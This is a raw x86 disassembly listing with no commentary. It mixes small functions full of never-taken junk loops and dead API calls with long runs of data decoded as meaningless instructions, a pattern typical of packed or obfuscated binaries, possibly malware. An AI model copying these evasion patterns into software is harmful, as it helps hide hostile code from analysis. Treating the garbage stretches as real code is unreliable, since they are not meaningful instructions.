  40322f:	ins    BYTE PTR es:[edi],dx
  403230:	xchg   edx,eax
  403231:	sbb    eax,0x13b79f22
  403236:	inc    esi
  403237:	xor    al,0x6b
  403239:	rcr    BYTE PTR [esi],0xde
  40323c:	aas    
  40323d:	fiadd  WORD PTR [edi+edx*2+0x1]
  403241:	les    ecx,FWORD PTR [ebp+0x5d8baa26]
  403247:	out    dx,al
  403248:	add    bl,BYTE PTR [edi+0x5e]
  40324b:	leave  
  40324c:	ret    0xc
  40324f:	push   ebp
  403250:	mov    ebp,esp
  403252:	mov    eax,ds:0x444224
  403257:	add    DWORD PTR ds:0x447998,edx
  40325d:	mov    edx,0x32729e
  403262:	movzx  ecx,WORD PTR ds:0x42473e
  403269:	or     DWORD PTR ds:0x44d40c,ecx
  40326f:	sub    eax,edx
  403271:	mov    ecx,DWORD PTR ds:0x44d41c
  403277:	or     DWORD PTR ds:0x44799c,ecx
  40327d:	mov    ecx,0x7510857
  403282:	and    DWORD PTR ds:0x44a6d0,0x4479a8
  40328c:	push   esi
  40328d:	and    DWORD PTR ds:0x41074b,0x0
  403297:	jmp    0x4032a9
  40329c:	mov    esi,DWORD PTR ds:0x41074b
  4032a2:	inc    esi
  4032a3:	mov    DWORD PTR ds:0x41074b,esi
  4032a9:	cmp    DWORD PTR ds:0x41074b,0x18
  4032b0:	jae    0x4032e1
  4032b6:	cmp    DWORD PTR ds:0x41074b,0x24
  4032bd:	jne    0x4032dc
  4032c3:	push   0x2dca
  4032c8:	push   0x41089f
  4032cd:	push   DWORD PTR [ebp-0x18]
  4032d0:	push   DWORD PTR [ebp-0x18]
  4032d3:	push   DWORD PTR [ebp-0x10]
  4032d6:	call   DWORD PTR ds:0x442004
  4032dc:	jmp    0x40329c
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	add    DWORD PTR ds:0x447980,0x447994
  4032ee:	xor    eax,ecx
  4032f0:	cmp    eax,esi
  4032f2:	je     0x403532
  4032f8:	mov    eax,ds:0x44421c
  4032fd:	xor    DWORD PTR ds:0x44d428,0x43cf
  403307:	jmp    0x4033ac
  40330c:	rol    BYTE PTR ds:0xad798db9,1
  403312:	loopne 0x403391
  403314:	dec    esi
  403315:	push   edi
  403316:	mov    cl,0x6e
  403318:	das    
  403319:	mov    ds:0x2ee34bf,eax
  40331e:	jl     0x40339c
  403320:	hlt    
  403321:	jl     0x40339f
  403323:	jl     0x4032d9
  403325:	and    DWORD PTR [eax-0x75401bb1],0x7597477
  40332f:	sub    BYTE PTR [ecx],dh
  403331:	fisttp DWORD PTR [esi-0x2]
  403334:	repz mov cl,0x6a
  403337:	cmp    dh,BYTE PTR [edi]
  403339:	jno    0x403370
  40333b:	add    esi,edi
  40333d:	dec    ebp
  40333e:	out    dx,eax
  40333f:	inc    eax
  403340:	mov    DWORD PTR ds:0x71d64195,edi
  403346:	cmp    esi,DWORD PTR [esi+0x2c1968fa]
  40334c:	mov    ds:0x772212e4,al
  403351:	mov    al,ds:0x18d8832f
  403356:	xor    DWORD PTR [esi+0x1e],esi
  403359:	add    al,0x2e
  40335b:	pop    ecx
  40335c:	or     bh,BYTE PTR [ebp-0x11]
  40335f:	test   al,0x7d
  403361:	(bad)  
  403362:	int3   
  403363:	js     0x403330
  403365:	aad    0x42
  403367:	inc    ecx
  403368:	jmp    0xf69f51b6
  40336d:	pop    ebx
  40336e:	test   BYTE PTR [edi+0x1778da1e],dh
  403374:	sbb    BYTE PTR [edi],dl
  403376:	bound  edi,QWORD PTR [ebx-0x78]
  403379:	push   0x71e2cb3b
  40337e:	lods   eax,DWORD PTR ds:[esi]
  40337f:	shr    DWORD PTR cs:[ecx+0x7c4a8cd2],cl
  403386:	mov    esp,0x8e790e8c
  40338b:	out    0x1a,eax
  40338d:	add    DWORD PTR [ebx+0x6d],0xffffff9b
  403391:	es mov ebp,0x3890f6ea
  403397:	ja     0x4033a1
  403399:	fwait
  40339a:	aaa    
  40339b:	pushf  
  40339c:	jae    0x40335b
  40339e:	clc    
  40339f:	test   DWORD PTR [ebp-0x378ff2f6],0x40d6af96
  4033a9:	sub    eax,0x758b7e7d
  4033ae:	or     al,0x2b
  4033b0:	ret    0xa0e9
  4033b3:	add    BYTE PTR [eax],al
  4033b5:	add    BYTE PTR [esi+0x4698c424],bl
  4033bb:	js     0x40340f
  4033bd:	cmp    dl,BYTE PTR [eax+0x4a]
  4033c0:	fucomp st(0)
  4033c2:	in     al,dx
  4033c3:	sar    BYTE PTR [edi-0x62],cl
  4033c6:	data16 add bh,BYTE PTR [esp+edi*2-0xc]
  4033cb:	jl     0x403449
  4033cd:	jl     0x4033c0
  4033cf:	stc    
  4033d0:	jo     0x4033d1
  4033d2:	icebp  
  4033d3:	pushf  
  4033d4:	out    dx,al
  4033d5:	or     al,0xd8
  4033d7:	aam    0xdf
  4033d9:	jno    0x4033ca
  4033db:	repz aaa 
  4033dd:	cwde   
  4033de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033df:	mov    eax,0x27a4229e
  4033e4:	test   esi,edx
  4033e6:	fnsave ds:0x9efd95ba
  4033ec:	ror    edi,0x6e
  4033ef:	add    esi,DWORD PTR [ebx-0x7cd22d1d]
  4033f5:	mov    DWORD PTR [edx+0x1ddafc8e],ebp
  4033fb:	out    dx,eax
  4033fc:	fnstsw WORD PTR [esi]
  4033fe:	(bad)  
  4033ff:	pop    esp
  403400:	loope  0x403398
  403402:	add    bl,dl
  403404:	mov    ah,BYTE PTR ds:[esi+0x37b0f549]
  40340b:	pop    eax
  40340c:	fistp  QWORD PTR [esi]
  40340e:	rol    BYTE PTR [esi+0x44194db6],0xd2
  403415:	push   esp
  403416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403417:	aas    
  403418:	rcr    BYTE PTR [ebp+0x7f],0x23
  40341c:	push   edx
  40341d:	test   eax,0xb0428eb1
  403422:	pop    ecx
  403423:	clc    
  403424:	fwait
  403425:	cmp    eax,0x9bae7634
  40342a:	stos   DWORD PTR es:[edi],eax
  40342b:	add    al,0x6a
  40342d:	inc    edx
  40342e:	jnp    0x403416
  403430:	lahf   
  403431:	pop    ecx
  403432:	xor    ebx,DWORD PTR [ebx-0x2f]
  403435:	cmp    eax,0xa4d0b082
  40343a:	data16 adc BYTE PTR [ecx],dl
  40343d:	mov    ebp,0x7091eb08
  403442:	enter  0xcd71,0xe6
  403446:	mov    bh,0xff
  403448:	mov    eax,0xf0ce2284
  40344d:	jg     0x403475
  40344f:	repnz jmp 0x3348:0x84b24be3
  403457:	sar    DWORD PTR [ebx],0xc6
  40345a:	jne    0x403470
  403460:	mov    eax,ds:0x444224
  403465:	add    eax,DWORD PTR ds:0x44421c
  40346b:	jmp    0x40351c
  403470:	mov    eax,DWORD PTR [ebp+0xc]
  403473:	xor    eax,ecx
  403475:	jmp    0x40351a
  40347a:	ficomp WORD PTR [edx+0x22]
  40347d:	mov    WORD PTR [edx+0x277a5264],?
  403483:	adc    eax,0x1dc2fc0e
  403488:	mov    al,ds:0x7c05fec4
  40348d:	jl     0x403483
  40348f:	jl     0x40350d
  403491:	jl     0x40350b
  403493:	sti    
  403494:	or     eax,0xceb4704
  403499:	mov    ebx,0x74c4f02c
  40349e:	pop    eax
  40349f:	and    bl,BYTE PTR [eax-0xd894312]
  4034a5:	jl     0x403495
  4034a7:	xlat   BYTE PTR ds:[ebx]
  4034a8:	test   DWORD PTR [ebp-0x8],0xc00d769b
  4034af:	in     al,0xc8
  4034b1:	cmp    ecx,DWORD PTR [edx+ebp*2-0x3d]
  4034b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b6:	cmc    
  4034b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b8:	pop    eax
  4034b9:	sbb    ch,0xb2
  4034bc:	dec    edx
  4034bd:	or     al,0xb
  4034bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c0:	ret    0x9584
  4034c3:	lock outs dx,BYTE PTR ds:[esi]
  4034c5:	outs   dx,DWORD PTR ds:[esi]
  4034c6:	adc    al,dl
  4034c8:	and    ah,bh
  4034ca:	fwait
  4034cb:	and    DWORD PTR [edi+eiz*2-0x13],ebx
  4034cf:	bnd jmp 0xc2caaa55
  4034d5:	ins    DWORD PTR es:[edi],dx
  4034d6:	arpl   WORD PTR [edi-0x6d],si
  4034d9:	fiadd  WORD PTR [ecx+ecx*2+0x384fbac3]
  4034e0:	dec    ecx
  4034e1:	aaa    
  4034e2:	stos   DWORD PTR es:[edi],eax
  4034e3:	je     0x40348c
  4034e5:	cmp    BYTE PTR [esi],al
  4034e7:	daa    
  4034e8:	sti    
  4034e9:	ja     0x4034b6
  4034eb:	imul   al
  4034ed:	push   edi
  4034ee:	xchg   ebp,eax
  4034ef:	popf   
  4034f0:	and    ebp,DWORD PTR [ebx+0x53]
  4034f3:	jnp    0x40352c
  4034f5:	pop    ebp
  4034f6:	fs je  0x4034b4
  4034f9:	mov    ds,WORD PTR [esi-0x7]
  4034fc:	ret    
  4034fd:	call   0x99e8a62a
  403502:	pop    ecx
  403503:	mov    eax,ds:0xae0a1149
  403508:	pusha  
  403509:	(bad)  
  40350a:	xchg   ebx,eax
  40350b:	push   cx
  40350d:	gs popf 
  40350f:	sub    al,0x28
  403511:	outs   dx,DWORD PTR ds:[esi]
  403512:	pop    ebx
  403513:	pop    ebp
  403514:	mov    ch,0x99
  403516:	js     0x403532
  403518:	adc    BYTE PTR [ebx+eax*1+0x421ca3c2],ah
  40351f:	inc    esp
  403520:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  403526:	add    eax,edx
  403528:	mov    ds:0x444224,eax
  40352d:	jmp    0x40353c
  403532:	mov    eax,ds:0x444224
  403537:	mov    ds:0x44421c,eax
  40353c:	mov    eax,DWORD PTR [ebp+0x8]
  40353f:	mov    eax,DWORD PTR [eax]
  403541:	mov    ecx,DWORD PTR ds:0x44421c
  403547:	add    DWORD PTR [eax],ecx
  403549:	pop    esi
  40354a:	pop    ebp
  40354b:	ret    0x8
  40354e:	push   ebp
  40354f:	mov    ebp,esp
  403551:	sub    esp,0x44
  403554:	push   edi
  403555:	mov    eax,DWORD PTR [ebp+0xc]
  403558:	and    edi,DWORD PTR ds:0x447984
  40355e:	mov    DWORD PTR [ebp-0x10],eax
  403561:	mov    DWORD PTR ds:0x44d424,0x11
  40356b:	cmp    DWORD PTR ds:0x44d424,0x0
  403572:	je     0x4035af
  403578:	cmp    DWORD PTR ds:0x44d424,0x1d
  40357f:	jne    0x403595
  403585:	push   0x4107d0
  40358a:	push   0x4107e6
  40358f:	call   DWORD PTR ds:0x44234c
  403595:	mov    eax,ds:0x44d424
  40359a:	dec    eax
  40359b:	mov    ds:0x44d424,eax
  4035a0:	jmp    0x40356b
  4035a5:	xor    DWORD PTR ds:0x44a6dc,0x5830
  4035af:	mov    eax,DWORD PTR [ebp+0x8]
  4035b2:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4035b9:	mov    edi,DWORD PTR ds:0x44a6d0
  4035bf:	xor    DWORD PTR ds:0x44a6e0,edi
  4035c5:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4035cc:	xor    edx,DWORD PTR ds:0x42472e
  4035d2:	mov    edx,DWORD PTR [ebp+0x8]
  4035d5:	and    edi,edi
  4035d7:	jmp    0x40373c
  4035dc:	loopne 0x4035cc
  4035de:	enter  0xcaef,0xfd
  4035e2:	sti    
  4035e3:	in     eax,0xa8
  4035e5:	cmp    eax,edi
  4035e7:	jg     0x403578
  4035e9:	scas   al,BYTE PTR es:[edi]
  4035ea:	inc    edx
  4035eb:	xor    DWORD PTR [esi+0x4],esi
  4035ee:	jl     0x40366c
  4035f0:	xor    al,0x7f
  4035f2:	jl     0x403670
  4035f4:	pop    ds
  4035f5:	nop
  4035f6:	ins    BYTE PTR es:[edi],dx
  4035f7:	adc    eax,0x82744f8d
  4035fc:	mov    gs,WORD PTR [ebx+0x16646094]
  403602:	cmp    BYTE PTR [edi+ebp*4+0x22],0xe9
  403607:	or     BYTE PTR [edx+0xf],0xae
  40360b:	or     BYTE PTR [ebp-0x73],cl
  40360e:	jb     0x40368a
  403610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403611:	(bad)  
  403612:	mov    dl,0xd6
  403614:	dec    ebx
  403616:	loopne 0x40367c
  403618:	dec    ecx
  403619:	out    0xdb,eax
  40361b:	ss inc esp
  40361d:	loop   0x4035b7
  40361f:	popa   
  403620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403621:	mov    al,cl
  403623:	in     eax,0xa
  403625:	jmp    0xa99d:0x199818fe
  40362c:	push   ebx
  40362d:	ja     0x403653
  40362f:	imul   esi,DWORD PTR [esi-0x3bebbd71],0x40a55d17
  403639:	mov    ebp,0x9bd18113
  40363e:	jb     0x403600
  403640:	xlat   BYTE PTR ds:[ebx]
  403641:	fimul  WORD PTR [edi*2-0x535e6915]
  403648:	in     eax,dx
  403649:	mov    edx,0x70ddf1b3
  40364e:	mov    ah,0x32
  403650:	int    0x22
  403652:	dec    ecx
  403653:	jns    0x403693
  403655:	mov    ecx,DWORD PTR [edi]
  403657:	cmp    eax,0xf283b8ec
  40365c:	xor    ecx,DWORD PTR [ebx+0x9]
  40365f:	out    0x12,al
  403661:	gs push ss
  403663:	sbb    al,al
  403665:	pop    es
  403666:	adc    esp,DWORD PTR [ecx-0x10]
  403669:	leave  
  40366a:	xor    al,BYTE PTR [esi]
  40366c:	ror    BYTE PTR [edi-0x5f],0x98
  403670:	pop    esp
  403671:	add    ebp,DWORD PTR ds:0xb70bfbf5
  403677:	adc    al,0x73
  403679:	inc    edx
  40367a:	scas   al,BYTE PTR es:[edi]
  40367b:	mov    eax,ds:0x29ec86f9
  403680:	jecxz  0x40361d
  403682:	jne    0x403703
  403684:	out    dx,al
  403685:	inc    ebx
  403686:	adc    cl,0x40
  403689:	mov    bl,0x9b
  40368b:	sbb    ebp,edi
  40368d:	mov    ecx,0x36d7218c
  403692:	pop    ss
  403693:	or     ecx,esp
  403695:	cli    
  403696:	imul   edx,esi,0x77
  403699:	out    0x1a,eax
  40369b:	jecxz  0x403623
  40369d:	es pop eax
  40369f:	lods   eax,DWORD PTR ds:[esi]
  4036a0:	ret    0xe986
  4036a3:	lahf   
  4036a4:	pop    ecx
  4036a5:	stos   BYTE PTR es:[edi],al
  4036a6:	or     DWORD PTR [ebp+0x38],ebx
  4036a9:	sub    al,0x63
  4036ab:	push   edx
  4036ac:	xor    BYTE PTR [eax+ebx*1],bh
  4036af:	call   0xc62cb241
  4036b4:	cmp    DWORD PTR [ecx+0x4d],esi
  4036b7:	ins    DWORD PTR es:[edi],dx
  4036b8:	lods   eax,DWORD PTR ds:[esi]
  4036b9:	push   ds
  4036ba:	test   al,0x74
  4036bc:	rcr    DWORD PTR [ebp+0x69c7a5ee],0x4f
  4036c3:	ds push esi
  4036c5:	rcr    edx,cl
  4036c7:	xchg   edx,eax
  4036c8:	aas    
  4036c9:	clc    
  4036ca:	inc    ecx
  4036cb:	ret    
  4036cc:	mov    al,ds:0x89650c4e
  4036d1:	nop
  4036d2:	icebp  
  4036d3:	mov    bh,0xeb
  4036d5:	push   esp
  4036d6:	xor    BYTE PTR [esi],dh
  4036d8:	lds    esi,FWORD PTR [ecx-0x5ee73d82]
  4036de:	stos   DWORD PTR es:[edi],eax
  4036df:	xor    ebx,edi
  4036e1:	or     edx,esi
  4036e3:	mov    ds:0x724517d6,al
  4036e8:	fdiv   DWORD PTR [edi-0x2]
  4036eb:	sub    esp,DWORD PTR [ecx-0x8]
  4036ee:	stos   DWORD PTR es:[edi],eax
  4036ef:	push   ebx
  4036f0:	sar    DWORD PTR ds:0x47a90197,1
  4036f6:	mov    DWORD PTR [edx+0xb],esp
  4036f9:	outs   dx,DWORD PTR ds:[esi]
  4036fa:	or     DWORD PTR [eax+ebp*4],esp
  4036fd:	jbe    0x403752
  4036ff:	push   eax
  403700:	(bad)  
  403701:	rcr    DWORD PTR [ecx-0x66fbd91a],1
  403707:	sbb    BYTE PTR [edx+esi*8],bh
  40370a:	add    ebp,esi
  40370c:	repz sti 
  40370e:	xor    eax,0x1ca7ec65
  403713:	icebp  
  403714:	mov    ecx,0xb9e17d0c
  403719:	stc    
  40371a:	cmp    ecx,DWORD PTR [ecx+0x22a5b2e1]
  403720:	lahf   
  403721:	ror    DWORD PTR [edi-0x4700ef29],0xa5
  403728:	sbb    eax,0xa94587b7
  40372d:	push   cs
  40372e:	push   0xbf7b8f39
  403733:	jl     0x403714
  403735:	outs   dx,BYTE PTR ds:[esi]
  403736:	clc    
  403737:	pop    DWORD PTR [esi-0x7679b090]
  40373d:	inc    ebp
  40373e:	sar    BYTE PTR [eax+0x7510857],0x33
  403745:	sar    BYTE PTR [ecx+0x32729e],1
  40374b:	add    edx,ecx
  40374d:	adc    edi,DWORD PTR ds:0x447990
  403753:	mov    DWORD PTR [ebp-0x8],edx
  403756:	mov    edi,DWORD PTR ds:0x4479bc
  40375c:	mov    edx,DWORD PTR ds:0x4479c4
  403762:	sub    edx,edi
  403764:	xor    edi,DWORD PTR [edi+edx*1]
  403767:	mov    edx,DWORD PTR [ebp+0x8]
  40376a:	xor    edx,eax
  40376c:	not    edi
  40376e:	add    edx,ecx
  403770:	add    DWORD PTR ds:0x447984,ebx
  403776:	mov    DWORD PTR [ebp+0xc],edx
  403779:	and    DWORD PTR ds:0x42472e,0x0
  403783:	mov    edx,DWORD PTR ds:0x42472e
  403789:	inc    edx
  40378a:	mov    DWORD PTR ds:0x42472e,edx
  403790:	cmp    DWORD PTR ds:0x42472e,0x4
  403797:	jne    0x4037b0
  40379d:	push   0x41073f
  4037a2:	push   DWORD PTR [ebp-0x28]
  4037a5:	push   0x6880
  4037aa:	call   DWORD PTR ds:0x442350
  4037b0:	cmp    DWORD PTR ds:0x42472e,0x3
  4037b7:	jne    0x4037cc
  4037bd:	xor    edx,edx
  4037bf:	xor    edx,DWORD PTR ds:0x42472e
  4037c5:	inc    edx
  4037c6:	mov    DWORD PTR ds:0x42472e,edx
  4037cc:	cmp    DWORD PTR ds:0x42472e,0x1b
  4037d3:	jb     0x403783
  4037d9:	adc    edi,DWORD PTR ds:0x44a6cc
  4037df:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  4037e6:	adc    edi,DWORD PTR ds:0x4479a4
  4037ec:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4037f3:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  4037fa:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403801:	and    DWORD PTR ds:0x424732,0x0
  40380b:	jmp    0x40381d
  403810:	mov    edx,DWORD PTR ds:0x424732
  403816:	inc    edx
  403817:	mov    DWORD PTR ds:0x424732,edx
  40381d:	cmp    DWORD PTR ds:0x424732,0x1e
  403824:	jae    0x40386c
  40382a:	cmp    DWORD PTR ds:0x424732,0xa
  403831:	jne    0x403847
  403837:	push   0x48af
  40383c:	push   0x400000
  403841:	call   DWORD PTR ds:0x442354
  403847:	cmp    DWORD PTR ds:0x424732,0x9
  40384e:	jne    0x403861
  403854:	mov    edx,DWORD PTR ds:0x424732
  40385a:	inc    edx
  40385b:	mov    DWORD PTR ds:0x424732,edx
  403861:	jmp    0x403810
  403866:	or     DWORD PTR ds:0x447994,ecx
  40386c:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  403873:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40387a:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  403881:	or     edi,edx
  403883:	mov    edx,DWORD PTR [ebp+0x8]
  403886:	mov    DWORD PTR ds:0x424742,0x6ab7
  403890:	xor    edx,eax
  403892:	or     DWORD PTR ds:0x41075b,edx
  403898:	mov    edi,DWORD PTR [ebp-0x10]
  40389b:	add    edx,ecx
  40389d:	cmp    edi,edx
  40389f:	mov    DWORD PTR ds:0x447980,0x7f1d
  4038a9:	je     0x40511b
  4038af:	mov    DWORD PTR ds:0x42472e,0x4e02
  4038b9:	push   ebx
  4038ba:	mov    DWORD PTR ds:0x44a6cc,0x557d
  4038c4:	jmp    0x4050f6
  4038c9:	mov    edx,DWORD PTR [ebp-0x8]
  4038cc:	and    DWORD PTR ds:0x44d41c,0x0
  4038d6:	jmp    0x4038e8
  4038db:	mov    edi,DWORD PTR ds:0x44d41c
  4038e1:	inc    edi
  4038e2:	mov    DWORD PTR ds:0x44d41c,edi
  4038e8:	cmp    DWORD PTR ds:0x44d41c,0x10
  4038ef:	jae    0x403921
  4038f5:	cmp    DWORD PTR ds:0x44d41c,0x19
  4038fc:	jne    0x403912
  403902:	push   0x7f28
  403907:	push   0x230d
  40390c:	call   DWORD PTR ds:0x442358
  403912:	jmp    0x4038db
  403917:	mov    DWORD PTR ds:0x447984,0x3377
  403921:	mov    edi,DWORD PTR [ebp-0x10]
  403924:	or     DWORD PTR ds:0x44a6e4,0x66ab
  40392e:	jmp    0x403a93
  403933:	std    
  403934:	xor    al,0x25
  403936:	mov    eax,ds:0x487d7d25
  40393b:	add    al,0x98
  40393d:	test   al,0x7f
  40393f:	lock js 0x4038f5
  403942:	inc    edi
  403943:	into   
  403944:	pop    es
  403945:	jl     0x4039c3
  403947:	xor    al,0x7f
  403949:	jl     0x4039c7
  40394b:	stc    
  40394c:	iret   
  40394d:	mov    eax,0x53e69852
  403952:	cmp    eax,0xc35b9752
  403957:	fistp  QWORD PTR ds:[ecx-0x258348d6]
  40395e:	or     dh,al
  403960:	cmp    DWORD PTR [esi-0x601b7c4a],ebp
  403966:	cmp    edi,DWORD PTR [eax-0x7]
  403969:	scas   al,BYTE PTR es:[edi]
  40396a:	mov    ecx,0x8ada7fbb
  40396f:	ds sbb al,0xd1
  403972:	out    dx,eax
  403973:	mov    esi,DWORD PTR ds:0xad7a5d8b
  403979:	mov    edx,0x6b3ed465
  40397e:	lods   al,BYTE PTR ds:[esi]
  40397f:	xchg   esi,eax
  403980:	adc    bl,BYTE PTR [edi+ebx*2-0x15e42b9d]
  403987:	push   es
  403988:	and    al,0xc7
  40398a:	aam    0xeb
  40398c:	or     al,0x8a
  40398e:	jno    0x4039f1
  403990:	int3   
  403991:	ja     0x4039b3
  403993:	inc    ebp
  403994:	xchg   DWORD PTR ds:0xa70f2dd3,ebp
  40399a:	push   eax
  40399b:	out    dx,eax
  40399c:	push   ss
  40399d:	in     al,0xc9
  40399f:	push   edx
  4039a0:	mov    ch,BYTE PTR [eax+esi*4-0x18]
  4039a4:	(bad)  
  4039a5:	mov    ah,0x9b
  4039a7:	sub    ebp,DWORD PTR [esi-0x42]
  4039aa:	test   al,0x60
  4039ac:	xor    ah,dh
  4039ae:	call   FWORD PTR [esi+eax*2]
  4039b1:	test   al,0x4f
  4039b3:	cmp    esp,ecx
  4039b5:	mov    dh,0xae
  4039b7:	retf   
  4039b8:	mov    dh,0x4e
  4039ba:	inc    ecx
  4039bb:	xchg   ecx,eax
  4039bc:	sub    bh,BYTE PTR [esp+ebp*8+0x1a43eaab]
  4039c3:	xlat   BYTE PTR ds:[ebx]
  4039c4:	xor    BYTE PTR [ebx+0x673e0324],dl
  4039ca:	sar    BYTE PTR [esi],1
  4039cc:	pop    esi
  4039cd:	and    eax,0x6c26070a
  4039d2:	lds    ecx,FWORD PTR [ecx+0x71]
  4039d5:	sbb    ebx,DWORD PTR [ebx]
  4039d7:	sbb    ebp,DWORD PTR [edx-0x4d8fc28b]
  4039dd:	mov    bl,0x10
  4039df:	jecxz  0x4039c6
  4039e1:	mov    ch,0x88
  4039e3:	mov    al,ds:0x8e4eb080
  4039e8:	jle    0x403a45
  4039ea:	(bad)  
  4039eb:	clc    
  4039ec:	push   eax
  4039ed:	mov    edi,0xaefa1c50
  4039f2:	or     BYTE PTR [edi],0xef
  4039f5:	daa    
  4039f6:	clc    
  4039f7:	jne    0x4039d6
  4039f9:	sub    esp,DWORD PTR [edx+0x6e071233]
  4039ff:	in     eax,0xcc
  403a01:	mov    BYTE PTR [edi-0x15],al
  403a04:	hlt    
  403a05:	adc    al,0xd3
  403a07:	jp     0x403a04
  403a09:	dec    ecx
  403a0a:	imul   ecx,DWORD PTR [edi],0xffffff9b
  403a0d:	inc    esi
  403a0e:	push   0x37
  403a10:	fisubr WORD PTR [esi-0x47]
  403a13:	hlt    
  403a14:	adc    ah,cl
  403a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a17:	shufps xmm1,xmm5,0x7e
  403a1b:	sahf   
  403a1c:	mov    ds:0x2bb65879,eax
  403a21:	push   ebx
  403a22:	scas   al,BYTE PTR es:[edi]
  403a23:	pop    ebp
  403a24:	imul   eax,DWORD PTR [esi],0xa747b95c
  403a2a:	adc    al,0xd9
  403a2c:	pop    ecx
  403a2d:	repnz fisttp DWORD PTR [edx-0x16]
  403a31:	cli    
  403a32:	xor    DWORD PTR ds:0x389644ba,esi
  403a39:	xor    ah,BYTE PTR [esi+0x45]
  403a3c:	pop    esp
  403a3d:	imul   ebx,DWORD PTR [ecx],0xffffffcb
  403a40:	cli    
  403a41:	(bad)  
  403a42:	(bad)  
  403a43:	sub    bh,ah
  403a45:	mov    ?,WORD PTR [ebp-0x2a]
  403a48:	ret    0x66f6
  403a4b:	sahf   
  403a4c:	lock lahf 
  403a4e:	popa   
  403a4f:	adc    DWORD PTR ds:0xe9a7c30e,ebx
  403a55:	ror    al,1
  403a57:	xor    cl,bh
  403a59:	sub    DWORD PTR [edi-0x678fbbab],ebp
  403a5f:	outs   dx,DWORD PTR ds:[esi]
  403a60:	shl    DWORD PTR [ebx+0x49],cl
  403a63:	xor    al,0x6f
  403a65:	das    
  403a66:	xor    ah,ah
  403a68:	addr16 enter 0xe70d,0xf1
  403a6d:	mov    ds:0x2caaaa96,eax
  403a72:	(bad)  
  403a73:	push   0x34387e99
  403a78:	pop    esp
  403a79:	test   DWORD PTR [ebx],esp
  403a7b:	or     eax,0xa520e3ae
  403a80:	xor    ch,BYTE PTR [ebx]
  403a82:	mov    edx,0xbeffd6bc
  403a87:	jne    0x403aff
  403a89:	lods   al,BYTE PTR ds:[esi]
  403a8a:	jge    0x403a1b
  403a8c:	frstor [esi+0x12]
  403a8f:	jae    0x403a22
  403a91:	and    bl,BYTE PTR ds:0x1581fa2b
  403a97:	adc    ah,dl
  403a99:	inc    esp
  403a9a:	add    BYTE PTR [eax-0x74ffffe6],dh
  403aa0:	push   ebp
  403aa1:	cld    
  403aa2:	xor    DWORD PTR ds:0x44a6e4,0x35da
  403aac:	xor    edx,eax
  403aae:	xor    DWORD PTR ds:0x44a6e8,0x513b
  403ab8:	add    edx,ecx
  403aba:	mov    DWORD PTR ds:0x44d414,0x7aea
  403ac4:	cmp    edi,edx
  403ac6:	mov    DWORD PTR ds:0x41073f,0x2e05
  403ad0:	jb     0x40511a
  403ad6:	xor    edx,0x3e56
  403adc:	mov    edx,DWORD PTR [ebp-0x28]
  403adf:	mov    edi,DWORD PTR [ebp-0x4]
  403ae2:	xor    edx,eax
  403ae4:	and    DWORD PTR ds:0x447980,0x0
  403aee:	jmp    0x403b02
  403af3:	xor    ebx,ebx
  403af5:	xor    ebx,DWORD PTR ds:0x447980
  403afb:	inc    ebx
  403afc:	mov    DWORD PTR ds:0x447980,ebx
  403b02:	cmp    DWORD PTR ds:0x447980,0x16
  403b09:	jae    0x403b9b
  403b0f:	cmp    DWORD PTR ds:0x447980,0xd
  403b16:	jne    0x403b25
  403b1c:	push   DWORD PTR [ebp-0x18]
  403b1f:	call   DWORD PTR ds:0x442008
  403b25:	cmp    DWORD PTR ds:0x447980,0xc
  403b2c:	jne    0x403b41
  403b32:	xor    ebx,ebx
  403b34:	xor    ebx,DWORD PTR ds:0x447980
  403b3a:	inc    ebx
  403b3b:	mov    DWORD PTR ds:0x447980,ebx
  403b41:	jmp    0x403af3
  403b46:	and    DWORD PTR ds:0x447980,0x0
  403b50:	jmp    0x403b64
  403b55:	xor    ebx,ebx
  403b57:	add    ebx,DWORD PTR ds:0x447980
  403b5d:	inc    ebx
  403b5e:	mov    DWORD PTR ds:0x447980,ebx
  403b64:	cmp    DWORD PTR ds:0x447980,0x19
  403b6b:	jae    0x403b9b
  403b71:	cmp    DWORD PTR ds:0x447980,0x1e
  403b78:	jne    0x403b96
  403b7e:	push   DWORD PTR [ebp-0x1c]
  403b81:	push   0x4801
  403b86:	push   0x66a1
  403b8b:	push   0x3965
  403b90:	call   DWORD PTR ds:0x4420d4
  403b96:	jmp    0x403b55
  403b9b:	xor    edi,eax
  403b9d:	mov    ebx,DWORD PTR ds:0x4479ac
  403ba3:	mov    ebx,DWORD PTR [ebx]
  403ba5:	sbb    DWORD PTR ds:0x424726,ebx
  403bab:	add    edi,ecx
  403bad:	jmp    0x403d12
  403bb2:	jno    0x403b37
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	imul   esp,DWORD PTR [ebp+0x727dd96d],0x2a
  403bbc:	pop    esi
  403bbd:	clc    
  403bbe:	not    BYTE PTR [ebx+0x686b916]
  403bc4:	jl     0x403c42
  403bc6:	xor    al,0x7f
  403bc8:	jl     0x403c46
  403bca:	je     0x403b95
  403bcc:	gs mov cl,0xef
  403bcf:	mov    ah,0xd7
  403bd1:	adc    DWORD PTR [edi-0x46],ebp
  403bd4:	pop    ss
  403bd5:	mov    dh,0x4d
  403bd7:	sub    edx,edx
  403bd9:	or     DWORD PTR [esi],esi
  403bdb:	push   0x26d62469
  403be0:	dec    eax
  403be1:	nop
  403be2:	fnsave [eax]
  403be4:	mov    edi,0xae62d9e3
  403be9:	nop
  403bea:	mov    edx,0x63aa0020
  403bef:	in     al,dx
